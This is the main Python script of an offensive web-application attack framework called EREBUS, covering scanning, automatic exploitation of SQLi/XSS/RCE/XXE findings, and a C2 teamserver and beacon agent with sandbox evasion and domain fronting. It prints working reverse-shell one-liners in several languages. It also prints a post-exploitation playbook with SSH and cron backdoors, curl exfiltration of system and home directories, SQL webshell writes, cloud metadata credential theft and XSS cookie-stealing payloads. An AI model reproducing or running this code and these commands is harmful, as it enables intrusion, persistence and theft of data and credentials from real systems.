#!/usr/bin/env python3
"""EREBUS v2.0 — Web Application Penetration Testing Framework"""

import os
import sys

# Force UTF-8 on stdout/stderr before colorama wraps them.
# Windows defaults to cp1252 which cannot encode box-drawing characters.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import argparse
import base64
import json
import logging
import re
import signal
import threading
import time
import traceback as _tb
from urllib.parse import urlparse
from colorama import init, Fore, Style

init(autoreset=True)

VERSION = "2.0.0"

BANNER = (
    f"{Fore.RED}\n"
    "╔═══════════════════════════════════════════════════════════════╗\n"
    "║                                                               ║\n"
    f"║   {Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██████{Fore.RED}╗ {Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██████{Fore.RED}╗ {Fore.WHITE}██{Fore.RED}╗   {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}███████{Fore.RED}╗        {Fore.RED}║\n"
    f"║   {Fore.WHITE}██{Fore.RED}╔════╝{Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╔════╝{Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔════╝        {Fore.RED}║\n"
    f"║   {Fore.WHITE}█████{Fore.RED}╗  {Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}█████{Fore.RED}╗  {Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}███████{Fore.RED}╗        {Fore.RED}║\n"
    f"║   {Fore.WHITE}██{Fore.RED}╔══╝  {Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╔══╝  {Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║╚════{Fore.WHITE}██{Fore.RED}║        {Fore.RED}║\n"
    f"║   {Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██████{Fore.RED}╔╝╚{Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}███████{Fore.RED}║        {Fore.RED}║\n"
    "║   ╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝        ║\n"
    "║                                                               ║\n"
    f"╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"
)

_EPILOG = """\
Examples:
  python erebus.py --scan --target https://target.com --output report.html

  python erebus.py --scan --target https://target.com --mode fast
  python erebus.py --scan --target https://target.com --mode deep --proxy http://127.0.0.1:8080

  python erebus.py --scan --target https://target.com --modules sqli,xss \\
      --proxy http://127.0.0.1:8080 --bearer eyJ...

  python erebus.py --scan --target https://target.com --exploit-all \\
      --command "id" --lhost 10.10.14.5 --lport 9001

  python erebus.py --scan --target https://target.com --exploit 0

  python erebus.py --scan --target "https://target.com/search?q=test" --no-crawl

  python erebus.py --scan --target https://target.com \\
      --attacker-url https://xyz.interact.sh \\
      --include "/api/" --exclude "/logout"

  python erebus.py --teamserver --port 8443

  python erebus.py --agent --c2 c2.attacker.com --master-key <HEX64> \\
      --fronting-host cdn.legit-site.com --proxy-c2 socks5://127.0.0.1:9050
"""

_VALID_MODULES    = frozenset({
    "sqli", "xss", "rce", "xxe",
    "auth", "acl", "sensitive", "ssti", "misconfig",
    "openredirect",
})

_MODE_PRESETS = {
    "fast": {
        "workers": 12, "timeout": 10, "depth": 1, "max_urls": 80,
        "modules": ["sqli", "xss", "auth", "sensitive", "misconfig"],
        "no_crawl": False, "skip_api": False, "skip_hh": True,
    },
    "balanced": {
        "workers": 10, "timeout": 15, "depth": 2, "max_urls": 300,
        "modules": sorted(_VALID_MODULES),
        "no_crawl": False, "skip_api": False, "skip_hh": False,
    },
    "deep": {
        "workers": 5, "timeout": 30, "depth": 4, "max_urls": 1000,
        "modules": sorted(_VALID_MODULES),
        "no_crawl": False, "skip_api": False, "skip_hh": False,
    },
}
_VALID_OUTPUT_EXTS = frozenset({"json", "md", "markdown", "html"})

_SEV_COLOR = {
    "Critical":      Fore.RED,
    "High":          Fore.YELLOW,
    "Medium":        Fore.YELLOW,
    "Low":           Fore.WHITE,
    "Informational": Fore.CYAN,
}

_EXPLOIT_SKIP = frozenset({
    "success", "exploited", "error", "reason", "vulnerability",
})

_VERBOSE = False


def _int_range(lo: int, hi: int):
    def _parse(s: str) -> int:
        try:
            v = int(s)
        except ValueError:
            raise argparse.ArgumentTypeError(f"expected an integer, got {s!r}")
        if not lo <= v <= hi:
            raise argparse.ArgumentTypeError(f"must be between {lo} and {hi}, got {v}")
        return v
    _parse.__name__ = f"int[{lo}-{hi}]"
    return _parse


def _valid_http_url(s: str) -> str:
    p = urlparse(s)
    if p.scheme not in ("http", "https") or not p.netloc:
        raise argparse.ArgumentTypeError(
            f"invalid URL {s!r} — must be http:// or https://host[/path]"
        )
    return s


def _valid_proxy_url(s: str) -> str:
    p = urlparse(s)
    if p.scheme not in ("http", "https", "socks4", "socks4a", "socks5", "socks5h") or not p.netloc:
        raise argparse.ArgumentTypeError(
            f"invalid proxy {s!r} — expected http://, https://, socks4://, or socks5://host:port"
        )
    return s


def _validate_modules(s: str) -> list:
    ml = [m.strip().lower() for m in s.split(",") if m.strip()]
    if not ml:
        raise argparse.ArgumentTypeError("module list cannot be empty")
    if "all" in ml:
        return sorted(_VALID_MODULES)
    unknown = sorted(set(ml) - _VALID_MODULES)
    if unknown:
        raise argparse.ArgumentTypeError(
            f"unknown module(s): {', '.join(repr(m) for m in unknown)}"
            f" — valid: {', '.join(sorted(_VALID_MODULES))}, all"
        )
    return ml


def _validate_output(s: str) -> str:
    ext = s.rsplit(".", 1)[-1].lower() if "." in s else ""
    if ext not in _VALID_OUTPUT_EXTS:
        raise argparse.ArgumentTypeError(
            f"unsupported extension {('.' + ext)!r} — use .json, .md, or .html"
        )
    return s


def _validate_hex64(s: str) -> str:
    s = s.strip()
    if len(s) != 64:
        raise argparse.ArgumentTypeError(f"must be exactly 64 hex characters, got {len(s)}")
    try:
        bytes.fromhex(s)
    except ValueError:
        raise argparse.ArgumentTypeError("contains non-hexadecimal characters")
    return s


def _validate_basic(s: str) -> str:
    if ":" not in s.strip():
        raise argparse.ArgumentTypeError("--basic must be in USER:PASS format (missing ':')")
    return s.strip()


def _nonempty_header(s: str) -> str:
    s = s.strip()
    if not s or not re.match(r'^[A-Za-z0-9\-_]+$', s):
        raise argparse.ArgumentTypeError(
            f"invalid HTTP header name {s!r} — letters, digits, hyphens, underscores only"
        )
    return s


def _die(msg: str, code: int = 1) -> None:
    print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}", file=sys.stderr)
    sys.exit(code)


def _warn(msg: str) -> None:
    print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")


def _ok(msg: str) -> None:
    print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")


def _sigint(*_) -> None:
    print(f"\n{Fore.YELLOW}[!] Interrupted — exiting.{Style.RESET_ALL}", file=sys.stderr)
    os._exit(0)


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="erebus",
        description=f"EREBUS v{VERSION} — Web application penetration testing framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=_EPILOG,
    )
    parser.add_argument("--version", action="version", version=f"EREBUS {VERSION}")

    grp = parser.add_argument_group("Scan")
    grp.add_argument("--scan",   action="store_true", help="Scan target for vulnerabilities")
    grp.add_argument("--target", type=_valid_http_url, metavar="URL", help="Target URL (http/https)")
    grp.add_argument(
        "--mode", choices=["fast", "balanced", "deep"], default=None, metavar="MODE",
        help="Scan preset — fast (speed), balanced (default), deep (thorough). Overrides --workers/--timeout/--depth/--modules/--skip-hh.",
    )
    grp.add_argument(
        "--modules", type=_validate_modules, default=sorted(_VALID_MODULES), metavar="LIST",
        help="Comma-separated module names: sqli,xss,rce,xxe,auth,acl,sensitive,ssti,misconfig  (default: all)",
    )
    grp.add_argument(
        "--output", type=_validate_output, default="report.json", metavar="FILE",
        help="Report file — extension selects format: .json / .md / .html  (default: report.json)",
    )
    grp.add_argument("--no-crawl", action="store_true", help="Skip crawler — test target URL only")
    grp.add_argument(
        "--depth", type=_int_range(1, 10), default=2, metavar="N",
        help="Crawler depth 1–10  (default: 2)",
    )
    grp.add_argument(
        "--max-urls", type=_int_range(1, 5000), default=300, metavar="N",
        help="Max URLs to crawl  (default: 300)",
    )
    grp.add_argument(
        "--workers", type=_int_range(1, 100), default=8, metavar="N",
        help="Parallel worker threads  (default: 8)",
    )
    grp.add_argument(
        "--attacker-url", type=_valid_http_url, default=None, metavar="URL",
        help="OOB callback URL for XXE/SSRF/XSS blind detection  (e.g. https://xyz.interact.sh)",
    )
    grp.add_argument("--skip-api", action="store_true", help="Skip API endpoint discovery")
    grp.add_argument("--skip-hh",  action="store_true", help="Skip host header injection test")
    grp.add_argument(
        "--scan-timeout", type=_int_range(0, 86400), default=0, metavar="SEC",
        help="Abort scan after N seconds and produce a partial report (0 = no limit)",
    )
    grp.add_argument("--stats",    action="store_true", help="Print HTTP engine stats after scan")
    grp.add_argument("-v", "--verbose", action="store_true", help="Debug logging + exception tracebacks")

    grp = parser.add_argument_group("Exploitation")
    grp.add_argument("--exploit-all", action="store_true", help="Auto-exploit all exploitable findings")
    grp.add_argument(
        "--exploit", type=_int_range(0, 9_999), metavar="INDEX",
        help="Exploit one finding by index (0-based, CVSS-sorted)",
    )
    grp.add_argument(
        "--command", default="id", metavar="CMD",
        help="Command for RCE exploitation  (default: id)",
    )
    grp.add_argument(
        "--loot-file", default="/etc/passwd", metavar="PATH",
        help="File to read for XXE/LFI  (default: /etc/passwd)",
    )
    grp.add_argument("--lhost", metavar="HOST", help="Attacker host for reverse shell generation")
    grp.add_argument(
        "--lport", type=_int_range(1, 65535), default=4444, metavar="PORT",
        help="Attacker port for reverse shells  (default: 4444)",
    )

    grp = parser.add_argument_group("HTTP")
    grp.add_argument(
        "--proxy", type=_valid_proxy_url, metavar="URL",
        help="HTTP proxy  (e.g. http://127.0.0.1:8080)",
    )
    grp.add_argument(
        "--timeout", type=_int_range(1, 300), default=15, metavar="SEC",
        help="Request timeout 1–300 seconds  (default: 15)",
    )
    grp.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL certificate verification")
    grp.add_argument("--stealth",       action="store_true", help="Slow, randomised pacing")
    grp.add_argument("--no-cache",      action="store_true", help="Disable HTTP response cache")

    grp = parser.add_argument_group("Authentication")
    grp.add_argument("--cookie",          metavar="K=V[;K=V]", help="Session cookies")
    grp.add_argument("--bearer",          metavar="TOKEN",      help="Authorization: Bearer <token>")
    grp.add_argument("--basic",           metavar="USER:PASS",  type=_validate_basic, help="HTTP Basic auth")
    grp.add_argument("--api-key",         metavar="KEY",        help="API key value")
    grp.add_argument(
        "--api-key-header", type=_nonempty_header, default="X-Api-Key", metavar="HEADER",
        help="Header name for --api-key  (default: X-Api-Key)",
    )

    grp = parser.add_argument_group("Scope")
    grp.add_argument(
        "--include", metavar="REGEX", action="append", default=[],
        help="Only test URLs matching this regex (repeatable)",
    )
    grp.add_argument(
        "--exclude", metavar="REGEX", action="append", default=[],
        help="Skip URLs matching this regex (repeatable)",
    )

    grp = parser.add_argument_group("C2")
    grp.add_argument("--teamserver", action="store_true", help="Start C2 teamserver")
    grp.add_argument(
        "--port", type=_int_range(1, 65535), default=8443, metavar="PORT",
        help="Teamserver listen port  (default: 8443)",
    )
    grp.add_argument("--agent", action="store_true", help="Run as C2 beacon agent")
    grp.add_argument("--c2",    metavar="HOST", help="C2 server hostname or IP")
    grp.add_argument(
        "--c2-port", type=_int_range(1, 65535), default=8443, metavar="PORT",
        help="C2 server port  (default: 8443)",
    )
    grp.add_argument("--master-key", type=_validate_hex64, metavar="HEX64", help="AES-256 master key (64 hex chars)")
    grp.add_argument("--no-evasion",     action="store_true", help="Disable VM/sandbox detection in agent")
    grp.add_argument("--proxy-c2",       type=_valid_proxy_url, metavar="URL", help="Proxy for agent C2 traffic")
    grp.add_argument("--fronting-host",  metavar="HOST", help="CDN hostname for domain fronting")
    grp.add_argument(
        "--sleep-min", type=_int_range(5, 3_600), default=30, metavar="SEC",
        help="Agent beacon minimum sleep  (default: 30)",
    )
    grp.add_argument(
        "--sleep-max", type=_int_range(10, 3_600), default=90, metavar="SEC",
        help="Agent beacon maximum sleep  (default: 90)",
    )

    return parser


def _validate_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    modes = sum([args.teamserver, args.agent, args.scan])
    if modes > 1:
        parser.error("--teamserver, --agent, and --scan are mutually exclusive")

    if (args.exploit is not None or args.exploit_all) and not args.scan:
        parser.error("--exploit / --exploit-all require --scan")

    if args.exploit is not None and args.exploit_all:
        parser.error("--exploit and --exploit-all are mutually exclusive")

    if args.bearer and args.basic:
        parser.error("--bearer and --basic are mutually exclusive (both set Authorization header)")

    if args.agent:
        if not args.c2:
            parser.error("--c2 HOST is required for --agent")
        if not args.master_key:
            parser.error("--master-key HEX64 is required for --agent")
        if args.sleep_min >= args.sleep_max:
            parser.error(
                f"--sleep-min ({args.sleep_min}) must be strictly less than"
                f" --sleep-max ({args.sleep_max})"
            )

    if args.scan and not args.target:
        parser.error("--target URL is required for --scan")

    for pattern in args.include + args.exclude:
        try:
            re.compile(pattern)
        except re.error as exc:
            parser.error(f"invalid regex pattern {pattern!r}: {exc}")


def _apply_mode_preset(args: argparse.Namespace) -> None:
    if not args.mode:
        return
    p = _MODE_PRESETS[args.mode]
    args.workers  = p["workers"]
    args.timeout  = p["timeout"]
    args.depth    = p["depth"]
    args.max_urls = p["max_urls"]
    args.modules  = p["modules"]
    args.no_crawl = p["no_crawl"]
    args.skip_api = p["skip_api"]
    args.skip_hh  = p["skip_hh"]


def _run_scan(args: argparse.Namespace) -> None:
    _apply_mode_preset(args)
    global _VERBOSE
    _VERBOSE = args.verbose

    if args.verbose:
        logging.basicConfig(
            level=logging.DEBUG,
            format="%(asctime)s  %(levelname)-7s  %(name)s: %(message)s",
            datefmt="%H:%M:%S",
        )
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.basicConfig(level=logging.WARNING)

    try:
        from core.http_engine import HTTPEngine
        from core.evasion import WAFEvasion
        from core.scanner import Scanner, ScopeManager
        from modules.sqli import SQLiModule
        from modules.xss import XSSModule
        from modules.rce import RCEModule
        from modules.xxe import XXEModule
        from modules.broken_auth import BrokenAuthModule
        from modules.access_control import AccessControlModule
        from modules.sensitive_data import SensitiveDataModule
        from modules.ssti import SSTIModule
        from modules.security_misconfig import SecurityMisconfigModule
        from modules.openredirect import OpenRedirectModule
    except ImportError as exc:
        _die(
            f"Import error: {exc}\n"
            f"  Run from the EREBUS root directory and ensure all dependencies are installed.\n"
            f"  Try: pip install -r requirements.txt"
        )

    attacker_url = args.attacker_url or ""
    ml = set(args.modules)
    needs_oob = not attacker_url and ("xxe" in ml or "xss" in ml)
    if needs_oob:
        _warn(
            "--attacker-url not configured — OOB/XSS blind callbacks will be non-functional.\n"
            "  Set up an interactsh/collaborator instance and pass --attacker-url <URL>"
        )

    http = HTTPEngine(
        proxy=args.proxy,
        timeout=args.timeout,
        pool_size=max(args.workers * 2, 10),
        stealth_mode=args.stealth,
        enable_cache=not args.no_cache,
        verify_ssl=not args.no_ssl_verify,
    )

    _apply_auth(http, args)

    scope = ScopeManager(
        include_patterns=args.include or None,
        exclude_patterns=args.exclude or None,
    )

    evasion = WAFEvasion(http)
    scanner = Scanner(
        args.target,
        http,
        evasion,
        max_workers=args.workers,
        scope=scope,
        api_discovery=not args.skip_api,
        host_header_test=not args.skip_hh,
    )

    modules = []
    if "sqli" in ml:
        modules.append(SQLiModule(http, evasion))
    if "xss" in ml:
        modules.append(XSSModule(http, evasion, callback_url=attacker_url))
    if "rce" in ml:
        modules.append(RCEModule(http, evasion))
    if "xxe" in ml:
        modules.append(XXEModule(http, attacker_url=attacker_url, evasion_engine=evasion))
    if "auth" in ml:
        modules.append(BrokenAuthModule(http, evasion))
    if "acl" in ml:
        modules.append(AccessControlModule(http, evasion))
    if "sensitive" in ml:
        modules.append(SensitiveDataModule(http, evasion))
    if "ssti" in ml:
        modules.append(SSTIModule(http, evasion))
    if "misconfig" in ml:
        modules.append(SecurityMisconfigModule(http, evasion))
    if "openredirect" in ml:
        modules.append(OpenRedirectModule(http, evasion))

    t0 = time.perf_counter()

    if args.scan_timeout > 0:
        _result: list = [None]

        def _scan_worker() -> None:
            _result[0] = scanner.scan(
                modules, crawl=not args.no_crawl,
                max_depth=args.depth, max_urls=args.max_urls,
            )

        _thread = threading.Thread(target=_scan_worker, daemon=True)
        _thread.start()
        _thread.join(timeout=args.scan_timeout)

        if _thread.is_alive():
            _warn(
                f"Scan timeout after {args.scan_timeout}s — "
                f"producing partial report ({len(scanner.findings)} finding(s) collected so far)"
            )
            from core.scanner import analyse_chains
            scanner.chains = analyse_chains(scanner.findings)
            findings = sorted(scanner.findings, key=lambda f: f.cvss, reverse=True)
        else:
            findings = _result[0] or []
    else:
        findings = scanner.scan(
            modules, crawl=not args.no_crawl,
            max_depth=args.depth, max_urls=args.max_urls,
        )

    elapsed = time.perf_counter() - t0
    _ok(f"Scan finished in {elapsed:.1f}s — {len(findings)} unique finding(s)")

    scanner.generate_report(args.output)

    if args.exploit_all:
        _exploit_all(findings, modules, args)
    elif args.exploit is not None:
        _exploit_one(findings, modules, args.exploit, args)

    if args.stats:
        http.print_stats()

    http.shutdown()


def _apply_auth(http, args: argparse.Namespace) -> None:
    from core.scanner import AuthManager
    auth = AuthManager()

    if args.bearer:
        auth.set_bearer(args.bearer)
    elif args.basic:
        user, pw = args.basic.split(":", 1)
        auth.set_basic(user, pw)

    if args.api_key:
        auth.set_api_key(args.api_key, args.api_key_header)

    if args.cookie:
        cookies: dict = {}
        for pair in args.cookie.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()
            elif pair:
                _warn(f"Ignored malformed cookie token: {pair!r} (expected name=value)")
        if cookies:
            auth.set_session_cookie(cookies)

    auth.inject(http)


def _mod_map(modules: list) -> dict:
    return {m.__class__.__name__.replace("Module", "").lower(): m for m in modules}


def _print_findings_table(targets: list) -> None:
    if not targets:
        return
    print(f"\n  {'#':<4} {'Severity':<12} {'CVSS':<6} {'Conf':>5}  {'Type':<30} URL")
    print(f"  {'─'*4} {'─'*12} {'─'*6} {'─'*5}  {'─'*30} {'─'*40}")
    for i, f in enumerate(targets):
        color   = _SEV_COLOR.get(f.severity.value, Fore.WHITE)
        vtype   = f.vuln_type[:29] + "…" if len(f.vuln_type) > 30 else f.vuln_type
        url_s   = f.url[:49] + "…" if len(f.url) > 50 else f.url
        print(
            f"  {Fore.CYAN}{i:<4}{Style.RESET_ALL}"
            f" {color}{f.severity.value:<12}{Style.RESET_ALL}"
            f" {f.cvss:<6.1f}"
            f" {f.confidence:>4.0%}"
            f"  {vtype:<30}"
            f" {url_s}"
        )
    print()


def _exploit_all(findings: list, modules: list, args: argparse.Namespace) -> None:
    targets = [f for f in findings if f.exploitable]
    if not targets:
        _warn("No findings flagged as exploitable in this scan.")
        return

    print(f"\n{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}  EXPLOITATION — {len(targets)} exploitable finding(s){Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    _print_findings_table(targets)

    mm = _mod_map(modules)
    for finding in targets:
        _exploit_finding(finding, mm, args)

    _print_post_exploit_playbook(targets, args)


def _exploit_one(findings: list, modules: list, index: int, args: argparse.Namespace) -> None:
    if not findings:
        _die("Scan returned no findings to exploit.")
    if index >= len(findings):
        _die(
            f"Index {index} out of range — {len(findings)} finding(s) available "
            f"(valid range: 0–{len(findings) - 1})"
        )

    finding = findings[index]

    print(f"\n{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}  EXPLOITATION — finding #{index}{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    _print_findings_table([finding])

    if not finding.exploitable:
        _warn(
            f"Finding #{index} ({finding.vuln_type}) is marked non-exploitable "
            f"(confidence={finding.confidence:.0%}) — attempting anyway."
        )

    _exploit_finding(finding, _mod_map(modules), args)


def _exploit_finding(finding, mod_map: dict, args: argparse.Namespace) -> None:
    color = _SEV_COLOR.get(finding.severity.value, Fore.WHITE)
    print(
        f"\n{color}[EXPLOIT] {finding.severity.value} · {finding.vuln_type}"
        f"  param={finding.parameter!r}  cvss={finding.cvss:.1f}{Style.RESET_ALL}"
    )
    if finding.evidence:
        print(f"  evidence : {finding.evidence[:120]}")
    if finding.payload:
        print(f"  payload  : {finding.payload[:120]}")

    mod = mod_map.get(finding.module.lower())
    if mod is None:
        _warn(f"Module '{finding.module}' is not active — skipped.")
        return
    if not hasattr(mod, "exploit"):
        _warn(f"Module '{finding.module}' has no exploit() method — manual exploitation required.")
        return
    if finding.raw is None:
        _warn("No raw vulnerability object attached to this finding — cannot auto-exploit.")
        return

    t0 = time.perf_counter()
    try:
        mod_name = finding.module.lower()
        if mod_name == "rce":
            result = mod.exploit(finding.raw, command=args.command)
            if isinstance(result, dict) and result.get("success") and args.lhost:
                _print_reverse_shells(args.lhost, args.lport)
        elif mod_name == "xxe":
            result = mod.exploit(finding.raw, file_path=args.loot_file)
        else:
            result = mod.exploit(finding.raw)
    except Exception as exc:
        elapsed = time.perf_counter() - t0
        _warn(f"Exploit raised after {elapsed:.2f}s: {type(exc).__name__}: {exc}")
        if _VERBOSE:
            _tb.print_exc()
        return

    elapsed = time.perf_counter() - t0
    print(f"  elapsed  : {elapsed:.2f}s")
    _print_exploit_result(result)


def _print_exploit_result(result) -> None:
    if result is None:
        print(f"  {Fore.YELLOW}(no output returned){Style.RESET_ALL}")
        return

    if isinstance(result, dict):
        success = result.get("success", result.get("exploited"))
        if success is False:
            reason = result.get("error") or result.get("reason") or "no details"
            print(f"  {Fore.YELLOW}[!] Exploit unsuccessful: {reason}{Style.RESET_ALL}")
            return

        for key, val in result.items():
            if key in _EXPLOIT_SKIP or val is None or val == "" or val == {} or val == []:
                continue
            if isinstance(val, (dict, list)):
                try:
                    val_str = json.dumps(val, indent=2, default=str)
                except Exception:
                    val_str = str(val)
            else:
                val_str = str(val)
            if len(val_str) > 1000:
                val_str = val_str[:997] + "…"
            print(f"  {Fore.CYAN}{key:<22}{Style.RESET_ALL} {val_str}")
    elif isinstance(result, str):
        output = result if len(result) <= 1000 else result[:997] + "…"
        print(f"  {Fore.GREEN}{output}{Style.RESET_ALL}")
    else:
        print(f"  {Fore.GREEN}{result}{Style.RESET_ALL}")


def _print_reverse_shells(lhost: str, lport: int) -> None:
    print(f"\n  {Fore.RED}[*] Reverse shell one-liners  LHOST={lhost}  LPORT={lport}{Style.RESET_ALL}")
    shells = [
        ("bash tcp",
         f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        ("bash mkfifo",
         f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
        ("python3",
         f"python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),x) for x in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"),
        ("perl",
         f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"),
        ("php",
         f"php -r '$s=fsockopen(\"{lhost}\",{lport});$p=proc_open(\"/bin/sh\",array(0=>$s,1=>$s,2=>$s),$pi);'"),
        ("nc -e",
         f"nc -e /bin/sh {lhost} {lport}"),
        ("nc mkfifo",
         f"rm /tmp/f;mkfifo /tmp/f;nc {lhost} {lport} 0</tmp/f|/bin/sh -i 2>&1 1>/tmp/f"),
        ("powershell",
         f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$rb=([Text.Encoding]::UTF8).GetBytes($r2);$s.Write($rb,0,$rb.Length)}};$c.Close()\""),
        ("msfvenom hint",
         f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf > /tmp/sh && chmod +x /tmp/sh && /tmp/sh"),
    ]
    for name, cmd in shells:
        print(f"  {Fore.YELLOW}  [{name:<14}]{Style.RESET_ALL} {cmd}")
    print()


def _print_post_exploit_playbook(targets: list, args: argparse.Namespace) -> None:
    mods = {f.module.lower() for f in targets}
    if not mods:
        return

    print(f"\n{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.RED}  POST-EXPLOITATION PLAYBOOK{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")

    if "rce" in mods:
        lhost = args.lhost or "<LHOST>"
        lport = args.lport if args.lhost else "<LPORT>"
        print(f"\n{Fore.YELLOW}  [RCE]{Style.RESET_ALL}")
        print(f"    Recon      : id; whoami; uname -a; hostname; cat /etc/passwd; ip a")
        print(f"    PrivEsc    : sudo -l; find / -perm -4000 2>/dev/null; cat /etc/crontab")
        print(f"    SSH backdoor: echo '<PUBKEY>' >> ~/.ssh/authorized_keys")
        print(f"    Cron persist: (crontab -l 2>/dev/null; echo '* * * * * /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1') | crontab -")
        print(f"    Loot       : tar czf /tmp/loot.tgz /etc /var/www /home && curl http://{lhost}:{lport} -T /tmp/loot.tgz")

    if "sqli" in mods:
        print(f"\n{Fore.YELLOW}  [SQLi]{Style.RESET_ALL}")
        print(f"    Creds (MySQL)    : SELECT user,password FROM mysql.user;")
        print(f"    Creds (generic)  : SELECT * FROM users LIMIT 20;")
        print(f"    File read        : SELECT LOAD_FILE('/etc/shadow');")
        print(f"    Webshell write   : SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/sh.php';")
        print(f"    MSSQL xp_cmdshell: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';")
        print(f"    PgSQL COPY exec  : COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;")

    if "xxe" in mods:
        print(f"\n{Fore.YELLOW}  [XXE]{Style.RESET_ALL}")
        print(f"    Sensitive files : /etc/passwd  /etc/shadow  /proc/self/environ  ~/.ssh/id_rsa")
        print(f"    Web configs     : /var/www/html/wp-config.php  /etc/apache2/sites-enabled/000-default.conf")
        print(f"    AWS metadata    : http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        print(f"    GCP metadata    : http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
        print(f"    Azure metadata  : http://169.254.169.254/metadata/instance?api-version=2021-02-01")

    if "xss" in mods:
        cb = args.attacker_url or "<ATTACKER_URL>"
        print(f"\n{Fore.YELLOW}  [XSS]{Style.RESET_ALL}")
        print(f"    Session steal   : fetch('{cb}/c?d='+encodeURIComponent(document.cookie),{{mode:'no-cors'}})")
        print(f"    CSRF chain      : Forge state-changing requests with victim's session")
        print(f"    Phishing        : Inject credential overlay (already in generated exploit payload)")
        print(f"    Pivot           : Load BeEF hook: <script src=http://{cb}/hook.js></script>")

    print()


def _run_teamserver(args: argparse.Namespace) -> None:
    try:
        from c2.server import TeamServer
    except ImportError as exc:
        _die(f"C2 server unavailable: {exc}")
    TeamServer(port=args.port).run()


def _run_agent(args: argparse.Namespace) -> None:
    try:
        from c2.agent import Agent, BeaconConfig
    except ImportError as exc:
        _die(f"C2 agent unavailable: {exc}")
    cfg = BeaconConfig(
        c2_host=args.c2,
        c2_port=args.c2_port,
        master_key_hex=args.master_key,
        sleep_min=args.sleep_min,
        sleep_max=args.sleep_max,
        evasion_mode=not args.no_evasion,
        proxy=args.proxy_c2,
        fronting_host=args.fronting_host or "",
    )
    Agent(cfg).run()


def main() -> None:
    signal.signal(signal.SIGINT, _sigint)
    print(BANNER)

    parser = _build_parser()
    args = parser.parse_args()
    _validate_args(parser, args)

    if args.teamserver:
        _run_teamserver(args)
    elif args.agent:
        _run_agent(args)
    elif args.scan:
        _run_scan(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
